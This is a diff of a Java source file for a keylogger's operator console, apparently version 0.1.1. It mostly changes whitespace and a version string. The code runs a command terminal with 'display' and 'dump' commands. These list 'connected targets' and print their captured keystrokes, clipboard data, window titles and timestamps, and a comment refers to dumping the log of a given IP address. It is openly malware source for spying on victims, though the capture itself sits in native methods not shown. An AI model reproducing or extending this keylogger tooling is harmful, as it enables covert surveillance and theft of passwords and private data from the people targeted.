@@ -52,35 +52,35 @@ public class KeyLoggerInterface extends Frame{
                 */
                 Fname=b;
             }
-    }    
+    }
     /**
         Title: setConsoleColorDefault
         Description: restores the default color configuration of the
         console to its default state.
-        
+
     */
     public native void setConsoleColorDefault();
     /**
         Title: setConsoleColorCaptureInformationDefault
-        Description: set the default color configuration of the 
+        Description: set the default color configuration of the
         configuration used to color code clipboard data.
     */
     public native void setConsoleColorCaptureInformationCB();
     /**
         Title: setConsoleColorProcessInformation
-        Description: set the default color configuration of the 
+        Description: set the default color configuration of the
         configuration used to color code process information.
     */
     public native void setConsoleColorProcessInformation();
     /**
         Title: setConsoleColorTitleInformation
-        Description: set the default color configuration to the 
+        Description: set the default color configuration to the
         configuration used to color code the title information.
     */
     public native void setConsoleColorTitleInformation();
     /**
         Title: setConsoleColorCaptureInformation
-        Description: set the default color configuration to the 
+        Description: set the default color configuration to the
         configuration used to color code the keylogger data.
     */
     public native void setConsoleColorCaptureInformationKL();
@@ -91,7 +91,7 @@ public class KeyLoggerInterface extends Frame{
         output
     */
     public native keylogdata[] getBuffer();
-    
+
     private keylogdata[] connections;
 
     /**
@@ -101,20 +101,20 @@ public class KeyLoggerInterface extends Frame{
     */
     public void raiseConsole()
     {
-        
+
     }
     Scanner command = new Scanner(System.in);
     String commandStore;
     public  void Console()
     {
         System.out.print("\n\nJava Interface Initiated, starting the command terminal for"
-                + " the keylogger  V0.1.2\n"
+                + " the keylogger  V0.1.1\n"
                 + "to see a list of commands available,type 'help'\n\n");
         while (true)
         {
-            System.out.print("KeyLogger_V0.1.2\\Command> ");
+            System.out.print("KeyLogger_V0.1.1\\Command> ");
             commandStore = command.nextLine();
-           
+
             switch( commandStore.split(" ")[0])
             {
                 case "display":
@@ -146,9 +146,9 @@ public class KeyLoggerInterface extends Frame{
                              System.err.println("the id you provided is invalid, to get the id# of connected targets run the 'display' command!");
                              break;
                          }
-                    }   
+                    }
                     catch ( NumberFormatException e)
-                    { 
+                    {
                         System.err.println("invaild option: \n\n\tusage: dump <ID#>\n\nplease provide the identifier of the log you are trying to access\n"
                                 + "to see the id of all connected use the 'display' command.\n\n example:\n\tdump 3");
                         break;
@@ -189,14 +189,14 @@ public class KeyLoggerInterface extends Frame{
                                         {
                                             if(TitleList.item(z).getNodeName().compareTo("ProcessTitle")==0)
                                             {
-                                                
+
                                                  setConsoleColorTitleInformation();
                                                 System.out.print("Title: "+TitleList.item(z).getTextContent());
                                                  setConsoleColorDefault();
                                             }
                                             else if(TitleList.item(z).getNodeName().compareTo("TimeStamp")==0)
                                             {
-                                                
+
                                                  setConsoleColorTitleInformation();
                                                  System.out.println("Time Stamp: "+TitleList.item(z).getTextContent());
                                                  setConsoleColorDefault();
@@ -204,7 +204,7 @@ public class KeyLoggerInterface extends Frame{
                                             else if (TitleList.item(z).getNodeName().compareTo("logged")==0)
                                             {
                                                  NodeList LoggedList = TitleList.item(z).getChildNodes();
-                                                 
+
                                                  for(int x1=0; x1<LoggedList.getLength();x1++)
                                                  {
                                                      if (LoggedList.item(x1).getNodeName().compareTo("CaptureType")==0)
@@ -221,15 +221,15 @@ public class KeyLoggerInterface extends Frame{
                                                      }
                                                      else if (LoggedList.item(x1).getNodeName().compareTo("Capture")==0)
                                                      {
-                                                         
-                                                         System.out.println("\n"+LoggedList.item(x1).getTextContent()); 
+
+                                                         System.out.println("\n"+LoggedList.item(x1).getTextContent());
                                                          setConsoleColorDefault();
                                                      }
                                                  }
-                                                
+
                                             }
                                         }
-                                        
+
                                     }
                               }
                             }
@@ -244,12 +244,12 @@ public class KeyLoggerInterface extends Frame{
                     Logger.getLogger(KeyLoggerInterface.class.getName()).log(Level.SEVERE, null, ex);
                 }
                     setConsoleColorProcessInformation();
-                   
+
                     setConsoleColorDefault();
-          
+
                     //logic goes here to dump the log of a specified IP address
-               
-                    
+
+
                 break;
                 case "":
                 break;
@@ -266,11 +266,11 @@ public class KeyLoggerInterface extends Frame{
                 default:
                     System.out.println("invalid command\n");
                 break;
-                    
-                      
+
+
             }
         }
-      
-    
+
+
     }
 }
